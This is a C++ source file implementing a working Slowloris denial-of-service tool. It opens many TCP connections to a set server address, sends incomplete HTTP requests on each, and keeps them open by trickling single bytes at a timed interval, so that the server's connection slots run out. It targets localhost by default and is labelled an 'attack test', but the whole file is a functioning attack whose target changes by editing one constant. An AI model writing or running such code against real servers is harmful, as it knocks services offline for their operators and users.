#include <iostream>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 8080;

void slowlorisAttack(int connectionCount, int intervalMs) {
    std::vector<int> sockets;

#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    for (int i = 0; i < connectionCount; ++i) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == 0) {
            const char* partialRequest = "GET /index.html HTTP/1.1\r\nHost: localhost\r\n";
            send(sock, partialRequest, strlen(partialRequest), 0);
            sockets.push_back(sock);
        } else {
            close(sock);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    std::cout << "Established " << sockets.size() << " connections" << std::endl;

    while (true) {
        for (int sock : sockets) {
            send(sock, "X", 1, 0);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(intervalMs));
    }

    for (int sock : sockets) {
        close(sock);
    }
#ifdef _WIN32
    WSACleanup();
#endif
}

int main(int argc, char* argv[]) {
    int connectionCount = 100;
    int intervalMs = 1000;

    if (argc >= 2) {
        connectionCount = std::stoi(argv[1]);
    }
    if (argc >= 3) {
        intervalMs = std::stoi(argv[2]);
    }

    std::cout << "Starting Slowloris attack test..." << std::endl;
    std::cout << "Connections: " << connectionCount << std::endl;
    std::cout << "Keep-alive interval: " << intervalMs << "ms" << std::endl;

    slowlorisAttack(connectionCount, intervalMs);

    return 0;
}